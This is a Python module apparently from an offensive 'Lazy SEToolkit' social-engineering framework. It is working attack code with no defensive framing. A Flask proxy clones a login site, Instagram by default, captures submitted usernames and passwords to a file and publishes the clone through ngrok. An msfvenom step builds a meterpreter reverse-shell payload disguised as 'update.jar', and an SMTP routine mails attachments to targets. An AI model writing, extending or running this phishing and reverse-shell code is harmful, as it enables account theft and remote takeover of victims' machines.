# modules/ops/social_engineering/lazy_setoolkit.py
import os
import sys
import time
import threading
import subprocess
import smtplib
import requests
import re
import urllib.parse
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
from flask import Flask, request, Response, send_from_directory
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich import box
from rich.prompt import Prompt
from urllib.parse import urljoin
from pyngrok import ngrok

# DETEKSI OS
IS_TERMUX = "com.termux" in os.getenv("PREFIX", "") or os.path.exists("/data/data/com.termux")
WIDTH = 78 if IS_TERMUX else 100
console = Console(width=WIDTH)

OPTIONS = {
    "LHOST": {"default": "ngrok"},
    "LPORT": {"default": "4444"},
    "TARGET": {"default": "https://instagram.com"},
    "SMTP_USER": {"default": ""},
    "SMTP_PASS": {"default": ""},
    "SMTP_SERVER": {"default": "smtp.gmail.com"},
    "SMTP_PORT": {"default": "587"},
    "PAYLOAD": {"default": "windows/meterpreter/reverse_tcp"}
}

app = Flask(__name__)
base_url = ""
session = requests.Session()
session.headers.update({"User-Agent": "Mozilla/5.0 (Linux; Android 10; K)"})

@app.route("/", methods=["GET", "POST"])
@app.route("/<path:path>", methods=["GET", "POST"])
def proxy_all(path=""):
    global base_url
    if not base_url:
        return "<h2>Server not ready</h2>", 503

    # CAPTURE IG AJAX
    if request.method == "POST" and "/login/ajax/" in request.path:
        raw_data = request.get_data(as_text=True)
        parsed = urllib.parse.parse_qs(raw_data)
        username = parsed.get("username", [None])[0]
        enc_pass = parsed.get("enc_password", [None])[0]
        if username:
            creds = f"username={username} | enc_password={enc_pass[:50]}..." if enc_pass else f"username={username}"
            line = f"[{time.strftime('%H:%M:%S')}] IG_AJAX: {creds}\n"
            with open("captured.txt", "a", encoding="utf-8") as f:
                f.write(line)
            console.print(f"[bold green][+] IG LOGIN: {creds}[/]")

    # CAPTURE FORM
    elif request.method == "POST":
        form = request.form.to_dict()
        user = next((form.get(f) for f in ["username","email","login"] if form.get(f)), None)
        pwd = next((form.get(f) for f in ["password","pass"] if form.get(f)), None)
        if user and pwd:
            creds = f"username={user} | password={pwd}"
            line = f"[{time.strftime('%H:%M:%S')}] FORM: {creds}\n"
            with open("captured.txt", "a", encoding="utf-8") as f:
                f.write(line)
            console.print(f"[bold green][+] FORM LOGIN: {creds}[/]")

    target_url = urljoin(base_url, request.full_path)
    try:
        if request.method == "GET":
            r = session.get(target_url, timeout=15, allow_redirects=False)
        elif request.method == "POST":
            r = session.post(target_url, data=request.get_data(), headers={"Content-Type": request.content_type}, timeout=15, allow_redirects=False)
        excluded = ['content-encoding', 'content-length', 'transfer-encoding', 'connection']
        headers = [(k, v) for k, v in r.raw.headers.items() if k.lower() not in excluded]
        return Response(r.content, r.status_code, headers)
    except Exception as e:
        return f"<pre>Proxy failed: {e}</pre>", 502

def start_tunnel(mode, port):
    if mode == "ngrok":
        try:
            t = ngrok.connect(int(port), "http")
            url = t.public_url
            console.print(f"[bold magenta]Ngrok: {url}[/]")
            return url
        except: pass
    return f"http://localhost:{port}"

def generate_payload(lhost, lport, filename="payload.exe", fmt="exe"):
    cmd = ["msfvenom", "-p", OPTIONS["PAYLOAD"], f"LHOST={lhost}", f"LPORT={lport}", "-f", fmt, "-o", filename]
    try:
        subprocess.run(cmd, check=True, capture_output=True)
        console.print(f"[green][*] {filename} created[/]")
        return filename
    except: pass

def send_email(to, subj, body, attach=None):
    if not OPTIONS["SMTP_USER"]: return
    msg = MIMEMultipart()
    msg['From'] = OPTIONS["SMTP_USER"]
    msg['To'] = to
    msg['Subject'] = subj
    msg.attach(MIMEText(body, 'plain'))
    if attach and os.path.exists(attach):
        with open(attach, "rb") as f:
            part = MIMEBase('application', 'octet-stream')
            part.set_payload(f.read())
        encoders.encode_base64(part)
        part.add_header('Content-Disposition', f"attachment; filename= {os.path.basename(attach)}")
        msg.attach(part)
    try:
        s = smtplib.SMTP(OPTIONS["SMTP_SERVER"], int(OPTIONS["SMTP_PORT"]))
        s.starttls()
        s.login(OPTIONS["SMTP_USER"], OPTIONS["SMTP_PASS"])
        s.sendmail(OPTIONS["SMTP_USER"], to, msg.as_string())
        s.quit()
        console.print(f"[green]Sent to {to}[/]")
    except: pass

def website_attack_menu(lhost_mode, lport):
    while True:
        table = Table(width=WIDTH, box=box.SIMPLE, show_header=False)
        table.add_row("1) Java Applet Attack")
        table.add_row("2) Credential Harvester (Clone)")
        table.add_row("99) Back")
        console.print(Panel(table, title="Website Attack", border_style="yellow", width=WIDTH))
        choice = Prompt.ask("[cyan]set:web>[/]", choices=["1","2","99"], default="99")
        if choice == "2":
            url = Prompt.ask("Target URL", default=OPTIONS["TARGET"])
            if not url.startswith("http"): url = "https://" + url
            global base_url
            base_url = url.rstrip("/")
            threading.Thread(target=lambda: app.run("0.0.0.0", int(lport), threaded=True), daemon=True).start()
            time.sleep(3)
            public_url = start_tunnel(lhost_mode, lport)
            console.print(Panel(f"[bold green]CLONE LIVE[/]\n[link={public_url}]{public_url}[/]\n[+] Credentials → captured.txt", width=WIDTH))
            input("Press Enter...")
        elif choice == "1":
            url = start_tunnel(lhost_mode, lport)
            ip = url.split("://")[1].split(":")[0]
            jar = generate_payload(ip, lport, "update.jar", "jar")
            if jar:
                @app.route("/update.jar")
                def serve_jar(): return send_from_directory(".", "update.jar")
                threading.Thread(target=lambda: app.run("0.0.0.0", int(lport), threaded=True), daemon=True).start()
                time.sleep(2)
                console.print(Panel(f"[bold yellow]JAVA APPLET: {url}[/]", width=WIDTH))
                input("Enter...")
        elif choice == "99": break

def show_main_menu():
    console.print(Panel("Lazy SEToolkit", border_style="bright_red", width=WIDTH))
    table = Table(width=WIDTH, box=box.SIMPLE, show_header=False)
    items = ["Spear-Phishing","Website Attack","Infectious Media","Payload+Listener","Mass Mailer","Arduino","SMS","Wireless","QRCode","PowerShell","Exit"]
    for i, n in enumerate(items):
        num = str(i+1) if i<10 else "99"
        table.add_row(f"{num}) {n}")
    console.print(table)

def run(session_dict, options_dict):
    global OPTIONS
    OPTIONS.update(options_dict)
    console.print(f"[cyan][*] OS: {'Termux' if IS_TERMUX else 'Linux'}[/]")

    while True:
        show_main_menu()
        choice = Prompt.ask("[red]set>[/]", choices=[str(i) for i in range(1,11)]+["99"], default="99")
        if choice == "2": website_attack_menu(OPTIONS["LHOST"], OPTIONS["LPORT"])
        elif choice == "99":
            console.print("[green]Bye![/]")
            break
